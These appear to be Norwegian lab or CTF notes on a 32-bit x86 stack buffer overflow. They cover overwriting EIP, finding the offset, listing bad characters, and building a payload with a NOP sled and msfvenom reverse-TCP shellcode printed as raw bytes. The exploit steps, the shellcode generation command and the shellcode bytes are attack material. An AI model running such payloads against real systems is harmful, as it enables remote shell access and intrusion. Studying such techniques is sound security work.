Første bilde viser at vi har klart å overskrive eip addressen.

EIP er et register i x86 arkitekturer (32bit). Det står for "Extended Instruction Pointer".
Den vil fortelle PC'en hvor den skal gå for å eksekvere neste kode.

Neste bilde har vi funnet offsettet til der EIP addressen starter. Vi kan ta overskrive den addressen til å peke på skadelig kode.
Så før vi når EIP må vi sende 2060 bytes.

Payload:
run $(python -c 'print "\x55" * (2060-100-150) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4'

run $(python -c 'print "\x55" * (2150) + "<CHARS>" + "\x66" * 4')
Vi finner ut at 0x00 0x09 0x0a 0x20 er ugyldige chars.

Vi kan da crafte skadelig shellcode.
msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
\xbf\x4a\x9b\x51\x7d\xdb\xd1\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x12\x83\xc5\x04\x31\x7d\x0e\x03\x37\x95\xb3\x88\xf6\x72\xc4\x90\xab\xc7\x78\x3d\x49\x41\x9f\x71\x2b\x9c\xe0\xe1\xea\xae\xde\xc8\x8c\x86\x59\x2a\xe4\x67\x9a\xcc\xf5\xff\x98\xcc\x8f\x96\x15\x2d\xdf\x0f\x76\xff\x4c\x63\x75\x76\x93\x4e\xfa\xda\x3b\x3f\xd4\xa9\xd3\xd7\x05\x61\x41\x41\xd3\x9e\xd7\xc2\x6a\x81\x67\xef\xa1\xc2
Bytes: 95
 Ny payload:
run $(python -c 'print "\x55" * (2060-100-95)+ "\x90" * 100 + "<SHELLCODE>" + "\x66" * 4')
150-95 = 65